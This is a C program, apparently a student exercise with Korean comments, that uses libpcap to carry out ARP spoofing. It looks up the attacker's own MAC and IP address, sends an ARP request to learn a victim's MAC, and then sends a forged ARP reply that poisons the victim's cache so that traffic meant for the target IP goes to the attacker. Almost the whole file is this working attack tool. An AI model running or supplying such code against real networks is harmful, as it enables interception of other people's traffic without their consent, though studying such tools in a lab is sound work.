#include <pcap.h>
#include "ethheader.h"
#include "arpframe.h"
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netpacket/packet.h> // sockaddr_ll 구조체를 위해 필요
#include <net/ethernet.h>



#pragma pack(push, 1)
typedef struct _EtherArpPacket
{
    ethheader ETHER; 
    arpframe ARP; 
}EtherArpPacket;

typedef struct _IPpair
{
    char* sender_ip_str;
    char* target_ip_str;
    uint32_t sender_ip;
    uint32_t target_ip;
}IPpair;
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[])
{
    if (argc < 4)
    {
        usage();
        return -1;
    }
    char errbuf[PCAP_ERRBUF_SIZE];
    char* dev = argv[1];

    int pair_count = (argc -2) / 2;
    IPpair pairs[pair_count];

    for (int i = 0; i < pair_count ; i++)
    {
        pairs[i].sender_ip_str = argv[2 + i*2];
        pairs[i].target_ip_str = argv[2 + i*2 + 1];

        pairs[i].sender_ip = inet_addr(pairs[i].sender_ip_str); // 이러면 지금 sender_ip에 들어있는 order는 network order -> 나중에 갖다 쓸 때 ntohl은 몰라도 htonl은 안해도 됨. 
        pairs[i].target_ip = inet_addr(pairs[i].target_ip_str);
    }
    

    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); //pcap_open_live 더 공부해보기
    
    if(pcap == NULL)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
    }


    //여기는 나의(공격자의) MAC 주소와 ip 주소 가져오는 부분
    unsigned char my_MAC[6];
    uint32_t my_ip;

    struct ifaddrs *ifap, *ifa;
struct sockaddr_in *sa;

if (getifaddrs(&ifap) == 0) {
    for (ifa = ifap; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;

        // 1. MAC 주소 가져오기 (리눅스 방식: AF_PACKET)
        if (strcmp(ifa->ifa_name, dev) == 0 && ifa->ifa_addr->sa_family == AF_PACKET) {
            struct sockaddr_ll *sll = (struct sockaddr_ll *)ifa->ifa_addr;
            if (sll->sll_halen == 6) { // MAC 주소 길이는 6바이트
                memcpy(my_MAC, sll->sll_addr, 6);
                printf("Success! My MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
                       my_MAC[0], my_MAC[1], my_MAC[2], my_MAC[3], my_MAC[4], my_MAC[5]);
            }
        }

        // 2. IP 주소 가져오기 (AF_INET은 리눅스/macOS 공통)
        if (strcmp(ifa->ifa_name, dev) == 0 && ifa->ifa_addr->sa_family == AF_INET) {
            sa = (struct sockaddr_in *)ifa->ifa_addr;
            my_ip = sa->sin_addr.s_addr;
            // 이미 네트워크 바이트 순서로 저장됨
        }
    }
    freeifaddrs(ifap);
} else {
    perror("getifaddrs error");
    return -1;
}    
    //여기서부터 pair 1쌍씩에 대해 반복문 수행
   
    for (int i = 0; i < pair_count ; i++)
    {
        //우선 sender의 맥 주소를 알아내기 위해 sender와 arp request&reply 주고받기
        //arp request
        EtherArpPacket arprequest_packet;
    
        memset(arprequest_packet.ETHER.ether_dstMAC, 0xFF, 6);
        memcpy(arprequest_packet.ETHER.ether_srcMAC, my_MAC, 6);
        arprequest_packet.ETHER.ether_next_type = htons(0x0806);
        
        arprequest_packet.ARP.Hardware_Type = htons(1);
        arprequest_packet.ARP.Protocol = htons(0x0800);
        arprequest_packet.ARP.Hardware_Length = 6;
        arprequest_packet.ARP.Protocol_Length = 4;
        arprequest_packet.ARP.Operation = htons(1); // request
        memcpy(arprequest_packet.ARP.Sender_MAC, my_MAC, 6);
        arprequest_packet.ARP.Sender_Protocol_Addr = my_ip;
        memset(arprequest_packet.ARP.Target_MAC, 0x00, 6);
        arprequest_packet.ARP.Target_Protocol_Addr = pairs[i].sender_ip; //여기서 htonl 안해야됨

        
        // --- 전송 직전 패킷 내부 정밀 검사 ---
        printf("\n[DEBUG] === ARP Request Packet Check ===\n");
        printf("1. Ether Dst MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", 
                arprequest_packet.ETHER.ether_dstMAC[0], arprequest_packet.ETHER.ether_dstMAC[1],
                arprequest_packet.ETHER.ether_dstMAC[2], arprequest_packet.ETHER.ether_dstMAC[3],
                arprequest_packet.ETHER.ether_dstMAC[4], arprequest_packet.ETHER.ether_dstMAC[5]);
        printf("2. Ether Type   : 0x%04x (Expect: 0806)\n", ntohs(arprequest_packet.ETHER.ether_next_type));
        printf("3. ARP Operation: %d (Expect: 1)\n", ntohs(arprequest_packet.ARP.Operation));

        struct in_addr s_ip, t_ip;
        s_ip.s_addr = arprequest_packet.ARP.Sender_Protocol_Addr;
        t_ip.s_addr = arprequest_packet.ARP.Target_Protocol_Addr;

        printf("4. Sender IP    : %s (My Mac IP)\n", inet_ntoa(s_ip));
        printf("5. Target IP    : %s (Who I want to find)\n", inet_ntoa(t_ip));
        printf("=========================================\n");
        

        if (pcap_sendpacket(pcap, (unsigned char*)&arprequest_packet, sizeof(arprequest_packet)) != 0) //pcap_sendpacket 더 공부해보기
        {
        fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(pcap));
        }
        printf("Struct Size: %lu bytes\n", sizeof(arprequest_packet));
        printf("[*] Sent ARP Request to find MAC \n");

        
        //여기서부터 arp reply
        
        unsigned char sender_MAC[6];
		while(1)
        {
            struct pcap_pkthdr* header;
            const u_char* packet;
            

            int res = pcap_next_ex(pcap, &header, &packet); //pcap_next_ex 더 공부해보기
            if(res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) 
            {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
                break;
            }
            
            EtherArpPacket* arpreply_packet = (EtherArpPacket*) packet;

            

            if(memcmp(arpreply_packet->ETHER.ether_dstMAC,my_MAC,6) != 0) continue; //Ethernet 수준에서 내(공격자) MAC주소로 온게 맞으면
            if(arpreply_packet->ETHER.ether_next_type != ntohs(0x0806)) continue; //ARP 패킷만 통과시키기
            if(arpreply_packet->ARP.Operation != ntohs(0x0002)) continue; //ARP 수준에서 Reply가 맞아야하고
            // 1~5번 항목을 한 줄에 출력 (가독성을 위해 탭(\t) 활용)

            printf("[DEBUG] 1.dstMAC:%02x:%02x 2.Type:%04x 3.Op:%d 4.SIP:%08x(Exp:%08x) 5.TIP:%08x(Exp:)\n",
            arpreply_packet->ETHER.ether_dstMAC[0], arpreply_packet->ETHER.ether_dstMAC[1], // 1. dstMAC 앞부분만 확인
            ntohs(arpreply_packet->ETHER.ether_next_type),                                // 2. EtherType
            ntohs(arpreply_packet->ARP.Operation),                                         // 3. ARP Opcode
            ntohl(arpreply_packet->ARP.Sender_Protocol_Addr),                              // 4. 패킷의 Sender IP
            ntohl(pairs[i].sender_ip),                                                     //    기대하는 Victim IP
            ntohl(arpreply_packet->ARP.Target_Protocol_Addr)                           // 5. 패킷의 Target IP
            );
            if(arpreply_packet->ARP.Sender_Protocol_Addr != pairs[i].sender_ip) continue; //ARP수준에서 arp payload에 담긴 sender ip가 main함수 인자로 넘겨준 sender ip와 같아야하고(ntohl할 필요 없음)
            if(memcmp(arpreply_packet->ARP.Target_MAC,my_MAC,6) != 0) continue; //ARP 수준에서 arp payload에 담긴 target MAC주소가 내 MAC 주소가 맞다면 통과시키기

            memcpy(sender_MAC,arpreply_packet->ETHER.ether_srcMAC,6);
            break;

        }


        //여기서부터 arp spoofing 패킷 만들기

        EtherArpPacket arp_spoofing_packet;
        memcpy(arp_spoofing_packet.ETHER.ether_dstMAC, sender_MAC, 6);
        memcpy(arp_spoofing_packet.ETHER.ether_srcMAC, my_MAC, 6); // ethernet level에서 src mac에 공유기의 mac 주소가 들어가야되는줄 알았음
        arp_spoofing_packet.ETHER.ether_next_type = htons(0x0806);

        arp_spoofing_packet.ARP.Hardware_Type = htons(0x01);
        arp_spoofing_packet.ARP.Protocol = htons(0x0800);
        arp_spoofing_packet.ARP.Hardware_Length = 0x06;
        arp_spoofing_packet.ARP.Protocol_Length = 0x04;
        arp_spoofing_packet.ARP.Operation = htons(0x02);
        memcpy(arp_spoofing_packet.ARP.Sender_MAC,my_MAC,6); // my_mac은 unsigned char형 배열 -> 바이트 변환 필요없음
        arp_spoofing_packet.ARP.Sender_Protocol_Addr = pairs[i].target_ip;
        memcpy(arp_spoofing_packet.ARP.Target_MAC, sender_MAC, 6);
        arp_spoofing_packet.ARP.Target_Protocol_Addr = pairs[i].sender_ip;


        if (pcap_sendpacket(pcap, (unsigned char*)&arp_spoofing_packet, sizeof(arp_spoofing_packet)) != 0) 
        {
        fprintf(stderr, "Error sending the  spoofing packet: %s\n", pcap_geterr(pcap));
        }
        printf("[*] Sent ARP Spoofing Packet to victim");


    }

        
    return 0;
}
